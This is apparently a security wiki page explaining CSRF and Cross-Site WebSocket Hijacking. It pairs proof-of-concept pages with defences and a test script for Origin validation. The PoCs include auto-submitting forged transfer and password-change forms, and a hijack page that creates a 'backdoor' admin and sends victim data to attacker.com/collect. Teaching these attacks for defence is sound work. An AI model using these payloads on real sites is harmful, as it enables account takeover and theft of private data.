# CSRF & WebSocket Hijacking (CSWSH)

**Tags:** #high #csrf #websocket #cswsh #session
**OWASP:** A01:2021 Broken Access Control
**CVSS Base:** 7.5 (High) → 9.3 (Critical → WebSocket + admin commands)

---

## 📖 What is it

**CSRF (Cross-Site Request Forgery):** forces the victim to perform unwanted actions on an application where they are already authenticated.

**CSWSH (Cross-Site WebSocket Hijacking):** the browser automatically sends session cookies in WebSocket connections, just as it does in HTTP requests. If the server does not validate the `Origin` header, any site can open an authenticated connection on behalf of the victim.

---

## 🔍 `grep_search` Tactics

```
# CSRF
csrf
csrfToken
X-CSRF-Token
SameSite
Set-Cookie

# WebSocket
new WebSocket(
io.on('connection'
WebSocketServer
ws.Server
WS.Server
socket.io
req.headers.origin    → check if validated in the handler
upgrade
```

---

## 💣 CSRF — How it Works

```
1. Victim logs in to bank.com (has a valid session cookie)
2. Victim visits evil.com (page controlled by the attacker)
3. evil.com contains a form that submits to bank.com/transfer
4. Browser automatically includes bank.com session cookies
5. Transfer is completed without the victim's knowledge
```

### CSRF GET PoC

```html
<!-- Action via image (GET) -->
<img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none">
```

### CSRF POST PoC

```html
<form id="csrf-form" action="http://bank.com/transfer" method="POST" style="display:none">
    <input name="to" value="attacker_account">
    <input name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### CSRF PoC with JSON (for REST APIs)

```html
<!-- Works if the endpoint accepts text/plain → parser processes it as JSON -->
<form action="http://api.target.com/v1/users/1234/password" method="POST" enctype="text/plain">
    <input name='{"password": "hacked", "ignore_me": "' value='test"}'>
</form>
<script>document.forms[0].submit();</script>
```

---

## 💣 Cross-Site WebSocket Hijacking (CSWSH)

**Difference from CORS:** WebSocket does not follow the CORS model. There is no preflight. The **only protection** is manual validation of the `Origin` header on the server.

### Vulnerable Code

```javascript
//  VULNERABLE — accepts any origin
const WebSocket = require('ws');
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    // No check of req.headers.origin!
    ws.on('message', (message) => {
        processMessage(message);
    });
});
```

### CSWSH PoC

```html
<!-- evil.html at http://attacker.com -->
<!DOCTYPE html>
<html>
<script>
    // Open authenticated WebSocket as the victim (browser includes cookies automatically)
    const ws = new WebSocket('wss://target.com/ws');
    
    ws.onopen = function() {
        console.log('Connection established as the victim!');
        
        // Read private data
        ws.send(JSON.stringify({ action: 'get_messages' }));
        ws.send(JSON.stringify({ action: 'get_profile' }));
        
        // If WebSocket has admin commands:
        ws.send(JSON.stringify({ action: 'create_admin', username: 'backdoor' }));
    };
    
    ws.onmessage = function(event) {
        // Exfiltrate received data
        const data = event.data;
        fetch('https://attacker.com/collect', { 
            method: 'POST', 
            body: data 
        });
    };
</script>
</html>
```

---

## ✅ CSRF Protections

### 1. CSRF Token (Synchronizer Token Pattern)

```python
#  Flask-WTF — automatic CSRF token
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# In Jinja2 templates:
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
```

```javascript
//  Express with csurf
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/form', (req, res) => {
    res.render('form', { csrfToken: req.csrfToken() });
});
```

### 2. SameSite Cookie (modern protection)

```python
#  SameSite=Strict — cookie not sent in cross-origin requests
response.set_cookie('session', session_id, samesite='Strict')

# SameSite=Lax — allows top-level GET (less friction)
response.set_cookie('session', session_id, samesite='Lax')
```

### 3. Custom Request Header (AJAX)

```javascript
//  REST APIs — check X-Requested-With or Content-Type header
// Browsers cannot send custom headers in cross-origin form submissions
app.post('/api/transfer', (req, res) => {
    if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
        return res.status(403).json({ error: 'CSRF detected' });
    }
});
```

---

## ✅ CSWSH Protection

```javascript
//  CORRECT — validate Origin during WebSocket handshake
const ALLOWED_ORIGINS = new Set([
    'https://app.mycompany.com',
    'https://admin.mycompany.com',
]);

const wss = new WebSocket.Server({ 
    port: 8080,
    verifyClient: ({ origin, req }, callback) => {
        if (!ALLOWED_ORIGINS.has(origin)) {
            console.warn(`CSWSH blocked: Origin=${origin}`);
            callback(false, 403, 'Forbidden');
            return;
        }
        callback(true);
    }
});
```

---

## 🧪 CSWSH Verification

```python
# .tmp/check_cswsh.py
import requests

TARGET = "http://target.com"
WS_ENDPOINT = "/ws"

# Attempt WebSocket handshake with malicious origin (via HTTP upgrade check)
EVIL_ORIGIN = "https://attacker.com"

# The browser performs the upgrade, but we can simulate the header with requests
r = requests.get(f"{TARGET}{WS_ENDPOINT}", 
                 headers={
                     "Origin": EVIL_ORIGIN,
                     "Connection": "Upgrade",
                     "Upgrade": "websocket",
                     "Sec-WebSocket-Version": "13",
                     "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ=="
                 }, timeout=10)

print(f"Status: {r.status_code}")
print(f"Relevant response headers:")
for h in ['Access-Control-Allow-Origin', 'Sec-WebSocket-Accept']:
    print(f"  {h}: {r.headers.get(h, '(not present)')}")

if r.status_code in [101, 200]:
    print("[⚠️] WebSocket handshake accepted from external origin → verify authenticity")
elif r.status_code == 403:
    print("[✅] Origin rejected with 403 → protection present")
```

---

## 🔗 Chain Exploits

```
CSRF on email change action → email changed → victim's password reset → Account takeover
CSRF + missing SameSite Strict → all POST actions executable by third parties
CSWSH + WebSocket with admin commands → RCE/Admin takeover via victim's browser
CSRF on financial operation → unauthorized transfer → fraud
CSWSH on support chat → reading all private messages
XSS + stolen CSRF token → full CSRF bypass even with protection in place
```

---

## 📌 References
- [[xss-cross-site-scripting]]
- [[authentication-session-management]]
- [[cors-misconfiguration]]
- [[http-security-headers]]
- [PortSwigger CSRF](https://portswigger.net/web-security/csrf)
- [PortSwigger WebSocket Security](https://portswigger.net/web-security/websockets)